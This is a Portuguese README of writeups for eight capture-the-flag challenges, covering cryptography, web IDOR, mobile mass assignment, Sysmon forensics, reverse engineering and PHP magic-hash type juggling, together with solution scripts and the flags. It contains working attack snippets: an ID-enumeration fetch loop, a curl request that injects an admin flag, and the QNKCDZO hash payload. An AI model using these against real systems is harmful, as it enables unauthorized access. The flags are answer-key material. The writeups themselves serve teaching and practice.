# 🧪 CTF Alquymia - Writeups

![Category](https://img.shields.io/badge/Category-CTF-brightgreen)
![Security](https://img.shields.io/badge/Security-Penetration%20Test-red)
![Language](https://img.shields.io/badge/Language-Portuguese-blue)

Este repositório contém os writeups detalhados e as soluções para os desafios do **CTF Alquymia**. O objetivo é documentar as metodologias de exploração, ferramentas utilizadas e scripts desenvolvidos durante a competição.

## 📋 Índice

- [0x01 - Crypto Ark (Criptografia)](#0x01---crypto-ark)
- [0x02 - Hollow (Web - IDOR)](#0x02---hollow)
- [0x03 - Todo App (Mobile - Mass Assignment)](#0x03---todo-app)
- [0x04 - Máquina Comprometida (Forense)](#0x04---máquina-comprometida)
- [0x05 - Supermercado (Engenharia Reversa)](#0x05---supermercado)
- [0x06 - Be-a-bá-do-Cripto (Criptoanálise)](#0x06---be-a-bá-do-cripto)
- [0x07 - Supermercado V2 (Engenharia Reversa Avançada)](#0x07---supermercado-v2)
- [0x08 - Senha Duplicada (Web - Type Juggling)](#0x08---senha-duplicada)

---

## 0x01 - Crypto Ark

**Categoria:** 🔐 Criptografia

### Descrição
O desafio consistia em recuperar uma mensagem cifrada (`flag.enc`) analisando um script de criptografia (`crypto-ark.py`) que utilizava uma cifra de substituição com chave progressiva.

### Solução
A análise do algoritmo revelou a fórmula $C_i = \text{ord}(P_i) + K_i$, onde a chave incrementa em 3 a cada caractere ($K_i = K_0 + 3i$). Utilizando um ataque de texto plano conhecido (*Known-Plaintext Attack*) no prefixo `ALQ`, recuperamos a seed inicial.

**Script de Solução:**
```python
cipher_values = [1402, ...] # Valores extraídos do flag.enc
k_inicial = 1337
flag = ""

for i, char_code in enumerate(cipher_values):
    current_key = k_inicial + (3 * i)
    decrypted_char = chr(char_code - current_key)
    flag += decrypted_char

print(f"Flag: {flag}")
```

🚩 **Flag:** `ALQ{3e9818816c141d8e137158739b69b821}`

---

## 0x02 - Hollow

**Categoria:** 🌐 Web

### Descrição
Exploração de uma vulnerabilidade de **IDOR (Insecure Direct Object Reference)** em um portal de conquistas de jogos para acessar dados ocultos.

### Solução
A aplicação realizava requisições para `/api/achievements/{id}` sem validar a autorização do usuário. Foi injetado um script no console do navegador para enumerar IDs sequenciais.

**Payload (Console do Navegador):**
```javascript
for (let i = 1; i <= 20; i++) {
    fetch(`/api/achievements/${i}`)
        .then(r => r.json())
        .then(data => {
            if (data.private === true) console.log(`[!] FOUND ID ${i}:`, data);
        });
}
```

O ID **7** retornou o objeto JSON contendo a flag.

🚩 **Flag:** `ALQ{1d0r_vu1n_h0ll0wn3st}`

---

## 0x03 - Todo App

**Categoria:** 📱 Mobile / API

### Descrição
Escalação de privilégios em um aplicativo Android (Flutter) explorando **Mass Assignment** na API de registro.

### Ferramentas
- `apktool`
- `strings`
- `curl`

### Solução
1. Engenharia reversa do APK revelou endpoints da API (`http://mobile-todo.alqlab.com`).
2. Tentativa de registro injetando a propriedade `is_admin`:
   ```bash
   curl -X POST [http://mobile-todo.alqlab.com/auth/register](http://mobile-todo.alqlab.com/auth/register) \
     -H "Content-Type: application/json" \
     -d '{"username": "hacker", "password": "123", "is_admin": true}'
   ```
3. O servidor retornou um token JWT de administrador, permitindo listar todas as tarefas e recuperar a flag.

🚩 **Flag:** `ALQ{129d119e12185b876315dbd494c65ffe}`

---

## 0x04 - Máquina Comprometida

**Categoria:** 🔍 Forense (Threat Hunting)

### Descrição
Análise de logs do Windows (**Sysmon**) para identificar a origem de uma infecção por malware (Patient Zero).

### Solução
A análise da árvore de processos (`Process Tree`) no Event ID 1 do Sysmon revelou a seguinte cadeia:
1. `explorer.exe` (Legítimo)
2. **`Firefox.exe` (PID 6172)** -> *Vetor Inicial*
3. `AutoPatch.exe` (Dropper)
4. `xJX.exe` (Payload)

O navegador Firefox foi o processo legítimo comprometido que iniciou a cadeia de ataque.

🚩 **Flag:** `ALQ{Firefox.exe,6172}`

---

## 0x05 - Supermercado

**Categoria:** ⚙️ Engenharia Reversa

### Descrição
Análise de um binário ELF 64-bit Linux simulando um caixa de supermercado para encontrar funcionalidades ocultas.

### Solução
A análise estática com `objdump` revelou uma comparação suspeita na função `main` com o valor `0x63` (99 em decimal), que não estava listado no menu. Ao inserir `99`, o programa exibiu um checksum hexadecimal que, quando decodificado para ASCII, revelou a flag.

🚩 **Flag:** `flag{R3v34s3_1s_4lq1ya1a}`

---

## 0x06 - Be-a-bá-do-Cripto

**Categoria:** 🔐 Criptografia

### Descrição
Reversão de um algoritmo de ofuscação Python (`crip1.py`).

### Fluxo Reverso
Para decifrar o arquivo `saida.txt`, as operações foram revertidas na ordem inversa:
1. Decode Base64
2. XOR com a chave `4002-8922`
3. Reverse String
4. Decode Hexadecimal (duplo)

🚩 **Flag:** `ALQ{2442c9271c3a213d156fa8ccf0ed014c}`

---

## 0x07 - Supermercado V2

**Categoria:** ⚙️ Engenharia Reversa

### Descrição
Bypass de múltiplas camadas de proteção criptográfica (XOR, ROT, Fibonacci, Vigenère) adicionadas à versão anterior do desafio.

### Solução
Apesar das novas proteções, a vulnerabilidade lógica da opção de debug (`99`) permaneceu. O código vazava o "Hash de Validação" em hexadecimal **antes** de aplicar as camadas de criptografia complexas. A flag foi obtida simplesmente convertendo esse hash vazado para ASCII.

🚩 **Flag:** `ALQ{52318fd4366f71ff6cdedde57b0814c1}`

---

## 0x08 - Senha Duplicada

**Categoria:** 🌐 Web

### Descrição
Bypass de autenticação em PHP 8.1 explorando **Type Juggling** e **Magic Hashes**.

### Solução
O backend comparava hashes MD5 usando `==` (loose comparison).
1. O hash da senha real começava com `0e` seguido apenas de números (Notação Científica = 0).
2. Foi utilizado o payload `QNKCDZO`, cujo hash também é `0e...`.
3. O PHP avaliou `0e... == 0e...` como `0 == 0` (True), permitindo o acesso.

🚩 **Flag:** `ALQ{9e99271ab05b699b6a6eabd78ce889ba}`

---

### ⚠️ Disclaimer
Este repositório é apenas para fins educacionais. As técnicas demonstradas foram realizadas em ambiente controlado (CTF) com autorização.
